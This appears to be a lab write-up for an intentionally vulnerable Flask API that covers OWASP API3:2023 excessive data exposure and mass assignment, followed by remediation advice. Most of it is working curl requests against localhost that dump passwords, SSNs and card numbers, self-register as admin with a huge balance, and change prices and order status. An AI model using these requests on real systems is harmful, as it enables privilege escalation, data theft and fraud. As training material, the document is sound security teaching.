API3:2023 Broken Object Property Level Authorization

HIGH SEVERITY

Description

This vulnerability encompasses two related issues:

  • Excessive Data Exposure: API returns more data than necessary, including sensitive fields
  • Mass Assignment: API accepts and processes properties that shouldn't be client-modifiable

Affected Files

  • app/routes/auth.py (registration mass assignment)
  • app/routes/users.py (user data exposure, update mass assignment)
  • app/routes/products.py (internal cost exposure, mass assignment)
  • app/routes/orders.py (order data exposure)
  • app/models.py (to_dict exposing sensitive fields)

Excessive Data Exposure

1. User Data Exposure

User endpoints expose passwords, SSN, credit cards, and internal notes:

# Get any user - exposes all sensitive fields
curl -s http://localhost:5000/api/users/1 | jq

# Response includes:
# - password (plain text!)
# - ssn
# - credit_card
# - api_key
# - internal_notes

# Even your own profile exposes too much
curl -s http://localhost:5000/api/users/me \
  -H "Authorization: Bearer $TOKEN" | jq '.user | {password, ssn, credit_card}'

2. Product Internal Data

Products expose internal cost and profit margins:

# Get products - exposes business-sensitive data
curl -s http://localhost:5000/api/products | jq '.products[] | {name, price, internal_cost, admin_notes}'

# Export endpoint exposes even more
curl -s http://localhost:5000/api/products/export | jq '.export[] | {name, price, internal_cost, profit_margin}'

3. Order Internal Data

Orders expose profit margins and internal tracking:

# All orders with internal data
curl -s http://localhost:5000/api/orders | jq '.orders[] | {id, total_price, profit_margin, internal_tracking}'

# Order statistics expose business metrics
curl -s http://localhost:5000/api/orders/statistics | jq

4. Coupon Internal Data

Coupons endpoint exposes employee/internal discount codes:

# Get all coupons including internal ones
curl -s http://localhost:5000/api/products/coupons | jq

# Find high-value internal coupons
curl -s http://localhost:5000/api/products/coupons | jq '.coupons[] | select(.is_internal == true)'

# INTERNAL50 - 50% off
# EMPLOYEE75 - 75% off
# FREEBIE100 - 100% off!

Mass Assignment Attacks

1. Privilege Escalation via Registration

Register with admin role and unlimited balance:

# Register as admin with huge balance
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "hacker@evil.com",
    "password": "hack123",
    "role": "admin",
    "balance": 999999.99,
    "is_active": true
  }'

# Verify the account has admin role
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "password": "hack123"}' | jq '.user | {role, balance}'

2. Update Any User Property

Modify role, balance, and any other field:

# Login as regular user
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "john", "password": "password123"}' | jq -r '.token')

# Give yourself admin role and money
curl -X PUT http://localhost:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "role": "admin",
    "balance": 1000000,
    "internal_notes": "Promoted myself to admin"
  }'

3. Product Mass Assignment

Set internal cost when creating products:

# Create product with internal fields
curl -X POST http://localhost:5000/api/products \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "My Product",
    "price": 100.00,
    "internal_cost": 1.00,
    "admin_notes": "Created via mass assignment"
  }'

# Modify existing product internal cost
curl -X PUT http://localhost:5000/api/products/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"internal_cost": 0.01}'

4. Order Mass Assignment

Set custom price, status, and assign to other users:

# Create order with manipulated price
curl -X POST http://localhost:5000/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 3,
    "quantity": 10,
    "total_price": 0.01,
    "status": "delivered",
    "user_id": 1
  }'

# Update order to delivered status
curl -X PUT http://localhost:5000/api/orders/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "delivered", "total_price": 0}'

Impact

  • Data Breach: Exposure of PII (SSN, credit cards, passwords)
  • Business Intelligence Leak: Competitors learn your costs and margins
  • Privilege Escalation: Users become admins via mass assignment
  • Financial Fraud: Manipulate balances, prices, and orders
  • Coupon Abuse: Use internal employee discounts

Remediation

  1. Create separate DTOs for input and output
  2. Whitelist allowed fields for updates
  3. Never expose sensitive fields in responses
  4. Use role-based field filtering
# Secure implementation example
@users_bp.route('/<int:user_id>', methods=['PUT'])
@token_required
def update_user(user_id):
    # Whitelist allowed fields
    ALLOWED_FIELDS = ['email', 'password']  # NOT role, balance, etc.

    data = request.get_json()
    update_data = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}

    # Apply updates only to allowed fields
    for key, value in update_data.items():
        setattr(user, key, value)
